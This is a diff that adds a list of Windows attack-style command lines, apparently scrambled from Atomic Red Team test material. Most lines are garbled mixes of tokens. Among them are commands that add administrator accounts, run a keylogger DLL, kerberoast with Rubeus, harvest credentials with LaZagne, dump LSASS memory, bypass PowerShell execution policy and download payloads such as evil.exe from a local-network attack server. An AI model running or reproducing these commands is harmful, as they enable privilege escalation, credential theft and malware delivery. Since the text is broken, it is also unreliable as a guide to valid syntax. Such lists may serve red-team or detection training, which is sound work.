@@ -1,0 +1,64 @@
+net localgroup administrators `` $ `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest -name `` autodialdll /f
+net `` query
+ren $ { output_zip_name } binpath=
+net localgroup administrators `` .\ { inprocserver32 file $ { binary_path } administrators
+sc query
+vssadmin create shadow os ; ] administrators }
+gpresult /z
+net group `` domain % cor_profiler = administrators
+rundll32 keylogger_dll.dll , keylog
+net localgroup administrators `` @ : `` domain
+$ consumerargs = @ `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } /user : @ filter = `` $ { shadow copy volumn name = hkey_local_machine\system\currentcontrolset\control\lsa ; binpath= set-wmiinstance all
+quser
+iediagcmd.exe /out : $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 }
+rubeus.exe kerberoast @ ( `` % components\atomic_test '' % windir % \system32\osk.exe % \system32\osk.exe
+net localgroup administrators `` @ `` $ { user_name } \inprocserver32 ;
+net localgroup administrators `` @ wscriptshell.createshortcut $ : domain admins `` $ { filename_regex }
+reg add `` hkey_local_machine\system\currentcontrolset\control\lsa cor_profiler administrators `` administrators '' -name `` cor_profiler
+net group `` '' `` hkey_local_machine\software\microsoft\windows /o ;
+net user administrator /add
+namp -sn $ shortcut = `` $ '' t1547.009 . -a `` @ % \users\
+remove-item -path $ { domain }
+auditpol -classname win32_processor | -accepteula ] : http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+set-executionpolicy -executionpolicy bypass -scope localmachine
+rundll32 popcalc.dll , keylog
+namp -sn -w user_name admins '' `` $ wscriptshell.createshortcut host : `` domain } in $ i in $ { filename_regex }
+net localgroup `` administrators { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5
+net localgroup administrators `` @ { user_name }
+net localgroup administrators `` defaultaccount
+`` `` localaccount=true $ } . `` kerberos i -sv \system\currentcontrolset\services\winsock2\parameters -name = : //192.168.1.29:9000/payload/evil.exe -o )
+$ shortcut = `` $ i = `` $ { vulnerable_version_of_amsi.dll } '' ( ) ;
+rundll32 popcalc.dll , keylog
+net group `` domain % \users\
+set-executionpolicy -executionpolicy bypass -scope localmachine
+rdrleakdiag.exe /p $ target = `` cor_profiler = `` '' , keylog
+lazagne.exe windows
+reg `` /l `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' `` reg_dword /v /f .id '' '' $ `` threadingmodel $ : \users\
+set-executionpolicy -scope -verbose
+rubeus.exe kerberoast :pth /user : $ target = `` $ consumer=set-wmiinstance
+net localgroup administrators /sc onlogon . `` nt\currentversion\winlogon\notify\atomicredteam '' '' -name `` appinit_dlls
+net localgroup administrators `` @ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 admins '' -name `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 admins `` $ { url or ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 -accepteula `` $ { filename_regex }
+python -c system -- net.webclient set-wmiinstance -namespace hklm : = http : installscreensaver ) -- http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+net localgroup administrators
+bitsadmin.exe /create $ { bits_job_name } -l $ { filename_regex
+reg add `` hklm\software\microsoft\windows nt\currentversion\windows `` localaccount=true '' `` threadingmodel '' /user administrators '' = `` $ { setup\installed temp { cor_profiler -filter administrators
+net stop
+rdrleakdiag.exe /p domain
+net group `` hklm\software\microsoft\windows /export `` domain -c `` `` hklm\system\currentcontrolset\control\session '' `` domain '' `` `` cor_profiler
+get-childitem -name : code
+net localgroup administrators `` @ { shadow processor ;
+microsoft.nodejstools.pressanykey.exe normal 1 $ { dll_path }
+`` powershell `` `` .\lazagne -r
+$ shortcut.targetpath= '' /add
+net accounts
+get-ciminstance ] : -r /user : clearing \software\microsoft\command os ; ; /failure 'https : \system\currentcontrolset\services\winsock2\parameters -name administrators
+namp -sn $ target } @ `` cor_profiler = `` cor_profiler
+lazagne.exe windows
+cmdkey.exe /list
+for : % -usebasicparsing % select-object name -- net.securityprotocoltype ] : net.webclient \\ { http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+net localgroup administrators `` t1547.009 /v `` administrators '' `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } t1547.009 /fullmemdmp objws = minidump i ; \windows\temp\lsass_dump.dmp
+ren $ { filename_regex
+bitsadmin.exe /create $ /d `` domain admins ''
+namp -sn @ `` $ { weak_service_name } \inprocserver32 '' ;
+net user $ `` hklm\software\microsoft\windows volumn as \\ $ { copy volumn name you shadow copy volumn account hkey_local_machine\system\currentcontrolset\control\lsa file `` cor_profiler -o
+rundll32.exe localappdata % objectcategory=computer % windir % \system32\osk.exe } '
